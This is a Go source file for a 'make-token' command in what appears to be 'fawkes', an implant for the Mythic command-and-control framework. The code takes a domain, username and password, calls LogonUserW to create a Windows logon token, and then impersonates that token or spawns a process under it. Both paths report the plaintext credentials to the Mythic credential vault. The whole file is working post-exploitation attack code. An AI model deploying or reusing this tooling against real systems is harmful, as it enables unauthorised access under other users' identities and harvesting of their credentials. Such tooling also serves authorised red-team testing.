//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from plaintext credentials and impersonate it, or spawn a process with it"
}

type MakeTokenParams struct {
	Domain    string `json:"domain"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	LogonType int    `json:"logon_type"` // Optional: defaults to LOGON32_LOGON_NEW_CREDENTIALS (9)
	Action    string `json:"action"`     // "impersonate" (default) or "spawn"
	Command   string `json:"command"`    // Command line for spawn action
}

// Execute implements Xenon's TokenMake function from Token.c (lines 189-264)
// and Apollo's SetIdentity from IdentityManager.cs
func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[MakeTokenParams](task)
	if parseErr != nil {
		return *parseErr
	}
	defer zeroCredentials(&params.Password)

	if params.Domain == "" {
		params.Domain = "."
	}

	if params.LogonType == 0 {
		params.LogonType = LOGON32_LOGON_NEW_CREDENTIALS
	}

	// Default action is impersonate
	action := strings.ToLower(params.Action)
	if action == "" {
		action = "impersonate"
	}

	switch action {
	case "impersonate":
		return makeTokenImpersonate(params)
	case "spawn":
		if params.Command == "" {
			return errorResult("command parameter is required for spawn action")
		}
		return makeTokenSpawn(params)
	default:
		return errorf("Unknown action: %s (use impersonate or spawn)", action)
	}
}

// makeTokenImpersonate is the original make-token behavior: create and impersonate.
func makeTokenImpersonate(params MakeTokenParams) structs.CommandResult {
	// Get current identity before token creation
	oldIdentity, _ := GetCurrentIdentity()

	// Revert any existing impersonation first
	if err := RevertCurrentToken(); err != nil {
		// Log but don't fail
	}

	// Create token via LogonUserW
	newToken, err := logonUser(params.Username, params.Domain, params.Password, params.LogonType)
	if err != nil {
		return errorf("%v", err)
	}

	// Store and impersonate the new token
	if err := SetIdentityToken(newToken); err != nil {
		windows.CloseHandle(windows.Handle(newToken))
		return errorf("Failed to impersonate token: %v", err)
	}

	// Store plaintext credentials for commands needing explicit auth (DCOM)
	SetIdentityCredentials(params.Domain, params.Username, params.Password)

	// Get new identity to confirm impersonation
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return errorf("Token created but failed to verify identity: %v", err)
	}

	// Record identity transition for history
	RecordIdentityTransition("maketoken", oldIdentity, newIdentity,
		fmt.Sprintf("%s\\%s", params.Domain, params.Username))

	// Format output
	output := fmt.Sprintf("Successfully impersonated %s", newIdentity)
	if oldIdentity != "" {
		output = fmt.Sprintf("Old: %s\nNew: %s", oldIdentity, newIdentity)
	}

	// Report plaintext credentials to Mythic vault
	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          params.Domain,
			Account:        params.Username,
			Credential:     params.Password,
			Comment:        "make-token",
		},
	}

	return structs.CommandResult{
		Output:      output,
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}

// makeTokenSpawn creates a token from credentials and spawns a process with it.
// The token is not stored for impersonation — the spawned process runs independently
// under the new token's security context.
func makeTokenSpawn(params MakeTokenParams) structs.CommandResult {
	// Create token via LogonUserW
	newToken, err := logonUser(params.Username, params.Domain, params.Password, params.LogonType)
	if err != nil {
		return errorf("%v", err)
	}
	defer windows.CloseHandle(windows.Handle(newToken))

	// Spawn process with the forged token
	result, err := spawnWithToken(newToken, params.Command)
	if err != nil {
		return errorf("Failed to spawn process: %v", err)
	}

	output := fmt.Sprintf("Spawned process as %s\\%s\n", params.Domain, params.Username)
	if result.Identity != "" {
		output = fmt.Sprintf("Spawned process as %s\n", result.Identity)
	}
	output += fmt.Sprintf("New PID: %d\n", result.PID)
	output += fmt.Sprintf("Command: %s", params.Command)

	// Report credentials to Mythic vault
	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          params.Domain,
			Account:        params.Username,
			Credential:     params.Password,
			Comment:        "make-token spawn",
		},
	}

	return structs.CommandResult{
		Output:      output,
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}

// logonUser creates a new token via LogonUserW.
func logonUser(username, domain, password string, logonType int) (windows.Token, error) {
	usernamePtr, err := syscall.UTF16PtrFromString(username)
	if err != nil {
		return 0, fmt.Errorf("failed to convert username: %w", err)
	}

	domainPtr, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return 0, fmt.Errorf("failed to convert domain: %w", err)
	}

	passwordPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return 0, fmt.Errorf("failed to convert password: %w", err)
	}

	// Select provider based on logon type
	provider := LOGON32_PROVIDER_DEFAULT
	if logonType == LOGON32_LOGON_NEW_CREDENTIALS {
		provider = LOGON32_PROVIDER_WINNT50
	}

	var newToken windows.Token
	ret, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(logonType),
		uintptr(provider),
		uintptr(unsafe.Pointer(&newToken)),
	)

	// Zero the UTF-16 password buffer immediately after use
	zeroUTF16Ptr(passwordPtr)

	if ret == 0 {
		return 0, fmt.Errorf("LogonUserW failed: %v (check credentials and logon type)", callErr)
	}

	if newToken == 0 {
		return 0, fmt.Errorf("LogonUserW succeeded but returned null token")
	}

	return newToken, nil
}
